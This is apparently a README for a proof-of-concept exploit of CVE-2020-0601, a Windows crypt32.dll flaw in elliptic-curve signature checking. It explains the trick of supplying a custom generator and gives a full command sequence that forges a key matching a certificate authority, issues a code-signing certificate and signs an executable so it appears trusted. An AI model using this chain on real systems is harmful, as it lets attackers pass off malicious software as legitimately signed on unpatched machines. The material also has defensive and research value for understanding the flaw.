### CVE-2020-0601 - PoC
Just a quick and small PoC CVE-2020-0601 for code signing PE files using a Certificate Authority using ECC.
I've chosen not to include any CA file. You can create one yourself with the following command:

    $ openssl ecparam -name secp384r1 -genkey > ca.key
    $ openssl req -new -x509 -key ca.key -out ca.crt
    
Also note that not all CA's allow code signing. They have different purposes.

The bug exploits `crypt32.dll` signature verification on elliptic curve. `crypt32.dll` only checks for matching public key and parameters, but not the generator `G`.
The private key is `d = [1, n - 1]`, where `n` is order of the curve
The public key is `Q` = `dG`.
The generator `G` is defined for each curve, but the bug allows your to specify your own generator. 

We know the public key of an CA and the curve it uses. Thus, we can simply set `d' = 1` and `G' = Q`. 

Since `Q = d'G'`, we know have a valid private key, as long as we choose our own generator. A better explanation can be found [here](https://news.ycombinator.com/item?id=22048619).

The PoC assumes you have the certificate of the CA you wish to spoof. In the following example, the certificate uses NIST P-384 (secp384r1) curve, but this works for different curves as well.

    # forge a spoofing key, where d = 1, G = Q
    $ ruby main.rb > fake.key 
    # generate a spoofing certificate with the spoofing key
    $ openssl req -new -x509 -key fake.key -out fake.crt 
    # generate a key for your own certificate:
    $ openssl ecparam -name secp384r1 -genkey > cert.key 
    # request a certificate signing request for code signing:
    $ openssl req -new -key cert.key -out cert.csr -config openssl.conf 
    # sign the certificate request with our fake certificate and fake key
    $ openssl x509 -req -days 365 -in cert.csr -CA fake.crt -CAkey fake.key -out cert.crt -CAcreateserial
    # pack the certificate with its key and the fake certificate into a pkcs12 file
    $ openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile fake.crt -out cert.p12
    # use osslsigncode (NIX) or signtool (Windows) to sign your desired PE exectuable
    $ osslsigncode sign -pkcs12 ./cert.p12 -t http://timestamp.verisign.com/scripts/timstamp.dll -in 7z1900-x64.exe -out 7z1900-x64_signed.exe
![Signed 7z](https://i.imgur.com/lQ9imcy.png)
